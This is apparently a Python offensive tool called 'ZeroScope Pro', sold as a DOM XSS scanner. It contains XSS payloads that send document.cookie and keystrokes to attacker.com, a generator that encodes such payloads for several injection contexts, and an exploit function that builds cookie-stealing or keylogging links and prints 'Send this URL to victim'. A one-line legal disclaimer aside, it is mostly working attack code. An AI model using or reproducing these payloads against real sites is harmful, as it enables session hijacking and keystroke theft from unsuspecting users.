#!/usr/bin/env python3
"""
ZeroScope Pro - Advanced Web Security Scanner
DOM XSS Scanner + Payload Generator
"""

import argparse
import requests
from urllib.parse import urljoin, quote
import base64
import os
from time import sleep

class ZeroScope:
    def __init__(self):
        self.payloads = {
            'dom': [
                "#<script>alert('DOM_XSS')</script>",
                "#javascript:alert(1)",
                "#\" onmouseover='alert(1)'",
                "#{alert(`DOM_XSS`)}"
            ],
            'html': {
                'alert': '<script>alert(1)</script>',
                'exfil': '<script>fetch("//attacker.com/?c="+document.cookie)</script>',
                'keylog': '<script>document.onkeypress=function(e){fetch("//attacker.com/?k="+e.key)}</script>'
            }
        }

    def scan_dom_xss(self, url):
        """Scan for DOM XSS vulnerabilities"""
        print(f"\n[+] Scanning {url} for DOM XSS...")
        vulns = []
        
        for payload in self.payloads['dom']:
            test_url = urljoin(url, payload)
            try:
                res = requests.get(test_url, timeout=5)
                if any(indicator in res.text for indicator in ["DOM_XSS", "alert(1)", "onmouseover"]):
                    vulns.append((test_url, payload))
                    print(f"[!] Vulnerable: {payload}")
            except Exception as e:
                print(f"[X] Error testing {payload}: {str(e)}")
        
        return vulns

    def generate_payloads(self, context, behavior, encode=None):
        """Generate context-specific payloads"""
        templates = {
            'html': {
                'alert': '<script>alert(1)</script>',
                'exfil': '<script>fetch("//attacker.com/?c="+document.cookie)</script>'
            },
            'attribute': {
                'alert': '\" onmouseover=alert(1)',
                'exfil': '\" onerror="fetch(\'//attacker.com/?c=\'+document.cookie)"'
            },
            'url': {
                'alert': 'javascript:alert(1)',
                'exfil': 'javascript:fetch("//attacker.com/?c="+document.cookie)'
            }
        }

        payload = templates[context][behavior]
        
        if encode == 'url':
            return quote(payload)
        elif encode == 'base64':
            return base64.b64encode(payload.encode()).decode()
        return payload

    def exploit(self, url, payload_type, callback=None):
        """Execute XSS exploitation"""
        if payload_type == 'cookie_steal':
            payload = f"<script>fetch('{callback}?c='+document.cookie)</script>"
        elif payload_type == 'keylogger':
            payload = f"<script>document.onkeypress=function(e){{fetch('{callback}?k='+e.key)}}</script>"
        else:  # Default alert
            payload = "<script>alert(1)</script>"

        test_url = urljoin(url, '#' + payload) if '#' in url else url + '#' + payload
        print(f"\n[+] Exploit URL: {test_url}")
        return test_url

def main():
    banner = """
███████╗███████╗██████╗ ░█████╗ ░██████╗░█████╗░░█████╗░██████╗░███████╗
╚════██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░███╔═╝█████╗░░██████╔╝██║░░██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝█████╗░░
██╔══╝░░██╔══╝░░██╔══██╗██║░░██║░╚═══██╗██║░░██╗██║░░██║██╔═══╝░██╔══╝░░
███████╗███████╗██║░░██║╚█████╔╝██████╔╝╚█████╔╝╚█████╔╝██║░░░░░███████╗
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝
"""
    print(banner)
    print("ZeroScope Pro - DOM XSS Scanner\n[!] LEGAL DISCLAIMER: Only test authorized systems!\n")

    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest='command', required=True)

    # XSS Scanner
    xss_parser = subparsers.add_parser('xss', help='XSS scanning')
    xss_parser.add_argument('-u', '--url', required=True, help='Target URL')
    xss_parser.add_argument('--dom', action='store_true', help='Scan for DOM XSS')
    xss_parser.add_argument('--exploit', choices=['alert', 'cookie_steal', 'keylogger'], help='Exploit type')
    xss_parser.add_argument('--callback', help='Callback URL for exfiltration')

    # Payload Generator
    payload_parser = subparsers.add_parser('generate', help='Generate XSS payloads')
    payload_parser.add_argument('--context', choices=['html', 'attribute', 'url'], required=True)
    payload_parser.add_argument('--behavior', choices=['alert', 'exfil'], required=True)
    payload_parser.add_argument('--encode', choices=['none', 'url', 'base64'], default='none')

    args = parser.parse_args()
    tool = ZeroScope()

    if args.command == 'xss':
        if args.dom:
            vulns = tool.scan_dom_xss(args.url)
            if vulns:
                print("\n[+] Found DOM XSS vulnerabilities:")
                for url, payload in vulns:
                    print(f"URL: {url}\nPayload: {payload}\n")
            else:
                print("[-] No DOM XSS vulnerabilities found")
        
        if args.exploit:
            if not args.callback and args.exploit != 'alert':
                print("[!] Callback URL required for exfiltration payloads")
                return
            exploit_url = tool.exploit(args.url, args.exploit, args.callback)
            print("[+] Send this URL to victim:", exploit_url)

    elif args.command == 'generate':
        payload = tool.generate_payloads(args.context, args.behavior, args.encode)
        print("\n[+] Generated Payload:")
        print(f"Context: {args.context}")
        print(f"Behavior: {args.behavior}")
        print(f"Encoding: {args.encode}")
        print("\nPayload:")
        print(payload)

if __name__ == "__main__":
    main()
